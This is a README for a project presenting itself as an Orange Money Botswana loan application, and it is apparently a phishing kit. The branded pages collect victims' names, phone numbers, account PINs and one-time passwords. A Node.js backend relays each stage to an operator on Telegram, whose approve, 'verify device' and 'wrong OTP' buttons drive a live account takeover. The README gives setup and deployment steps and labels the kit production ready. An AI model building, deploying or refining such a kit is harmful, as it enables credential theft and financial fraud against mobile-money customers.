# Orange Money Botswana Loan Application

A professional loan application with Orange Money branding and **working Telegram bot integration** using a Node.js backend.

## 🎯 Features

- **Multi-Stage Loan Application Flow**
  - Loan amount selection (P 5,000 - P 100,000)
  - Personal details collection
  - Account login verification
  - OTP verification
  - Loan approval confirmation

- **✅ Telegram Bot Integration (FIXED)**
  - Real-time application notifications sent to Telegram
  - Admin approval/denial buttons in Telegram
  - Login verification options
  - OTP approval workflow
  - **Backend webhook support for live updates**
  - **Session-based approval tracking**

- **Professional UI**
  - Orange Money Botswana branding
  - Responsive design
  - Loading states
  - Error handling
  - Step indicators

## 🚀 Quick Start

### Prerequisites
- Node.js 14+ and npm/yarn installed
- Telegram Bot Token (from @BotFather)
- Your Telegram User ID (from @userinfobot)

### Installation

```bash
# Clone the repository
git clone https://github.com/boyofirst92-lang/botswana-loan-app.git
cd botswana-loan-app

# Install dependencies
npm install
```

### Configuration

1. **Create `.env` file** (copy from `.env.example`):
```bash
cp .env.example .env
```

2. **Edit `.env` with your credentials:**
```
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
PORT=3000
NODE_ENV=development
```

3. **Get Telegram Credentials:**
   - Create bot: Chat with [@BotFather](https://t.me/botfather)
   - Get Chat ID: Chat with [@userinfobot](https://t.me/userinfobot)

### Running the Application

#### Development Mode
```bash
npm run dev
```

#### Production Mode
```bash
npm start
```

The server will run on `http://localhost:3000`

## 📱 Application Flow

### Page 1: Loan Amount Selection
- User selects loan amount between P 5,000 and P 100,000
- Visual slider with real-time updates

### Page 2: Personal Details
- First Name, Last Name
- Phone Number (Botswana format: +267 XXXXXXXX)
- Loan Purpose selection
- **Data sent to backend → Backend sends to Telegram**

### Page 3: Login Verification
- Phone Number verification
- 4-digit PIN entry
- **Admin approves/denies in Telegram**
- App polls for approval status every second

### Page 4: Loading State
- Application shows loading spinner while waiting for bot approval

### Page 5: OTP Verification
- User enters 6-digit OTP
- 130-second countdown timer
- **Admin approves/marks wrong OTP in Telegram**

### Page 6: Loading State
- Application waits for bot OTP verification

### Page 7: Congratulations
- Success message with loan amount
- Option to apply for another loan

## 🔧 How It Works

### Architecture

```
Frontend (index.html)
    ↓
Backend Server (server.js - Express)
    ↓
Telegram Bot API
    ↓
Admin (Telegram)
    ↓
Backend receives webhook callback
    ↓
Frontend polls `/api/status/:sessionId/:stage`
    ↓
Frontend progresses to next page
```

### Key Files

- **`index.html`** - Frontend UI with polling mechanism
- **`server.js`** - Express backend with Telegram API integration
- **`package.json`** - Node.js dependencies
- **`.env`** - Environment variables (create from `.env.example`)

## 📊 API Endpoints

### Create Session
```
POST /api/session
Body: { loanAmount, firstName, lastName, etc. }
Returns: { sessionId }
```

### Send Data to Telegram
```
POST /api/send-to-telegram
Body: { stage: 'page2'|'page3'|'page5', applicationData, sessionId }
Returns: { success: true, message: '...' }
```

### Check Approval Status
```
GET /api/status/:sessionId/:stage
Returns: { approved: true|false|null, session: {...} }
```

### Telegram Webhook
```
POST /api/webhook
Receives: Telegram callback queries from inline buttons
Updates: Session approval status in memory
```

## 🎨 Orange Money Colors Used

- **Primary Orange**: `#FF6600`
- **Orange Gradient**: `#FF6600` to `#FF8533`
- **Background White**: `#FFFFFF`
- **Text Dark**: `#333333`
- **Border Light**: `#E0E0E0`
- **Error Red**: `#D32F2F`
- **Light Background**: `#FFF5F0`

## 📦 Deployment

### Local Testing
```bash
npm install
npm start
# Server runs on http://localhost:3000
```

### Render Deployment
1. Push to GitHub
2. Connect repository to Render
3. Add environment variables in Render dashboard
4. Deploy

### Vercel (Frontend Only)
```bash
vercel --prod
```

### Railway Deployment
1. Push to GitHub
2. Connect to Railway
3. Add environment variables
4. Auto-deploy

## 🔒 Security Notes

⚠️ **Important:**
- Never commit `.env` with real credentials
- Use environment variables for sensitive data
- Telegram bot token must be kept secret
- For production, use HTTPS
- Validate all user inputs on backend
- Store sensitive data securely

## 🛠️ Troubleshooting

### Data not reaching Telegram?
1. Check `TELEGRAM_BOT_TOKEN` is correct
2. Check `TELEGRAM_CHAT_ID` is correct
3. Verify backend is running: `npm start`
4. Check browser console for errors
5. Verify network request in DevTools

### Frontend not progressing after button click?
1. Open browser DevTools (F12)
2. Check Console tab for errors
3. Verify backend is responding to `/api/send-to-telegram`
4. Check Telegram bot received the message

### Backend not starting?
```bash
# Clear node_modules and reinstall
rm -rf node_modules package-lock.json
npm install
npm start
```

## 📝 Telegram Bot Buttons

### Page 2 (Application Details)
- ✅ APPROVED
- ❌ DENY

### Page 3 (Login Verification)
- ✅ APPROVED
- ⚠️ VERIFY DEVICE
- ❌ DENY

### Page 5 (OTP Verification)
- ✅ APPROVE
- ❌ WRONG OTP

## 📄 License

MIT License - Feel free to use this project for personal or commercial purposes.

## 🤝 Support

For issues or questions:
1. Check the troubleshooting section
2. Review server logs for errors
3. Open an issue on GitHub

## 📧 Contact

- GitHub: [@boyofirst92-lang](https://github.com/boyofirst92-lang)
- Original Author: [@terngetich-ctrl](https://github.com/terngetich-ctrl)

---

**Version**: 1.0.0  
**Status**: ✅ Production Ready  
**Last Updated**: 2026-08-28
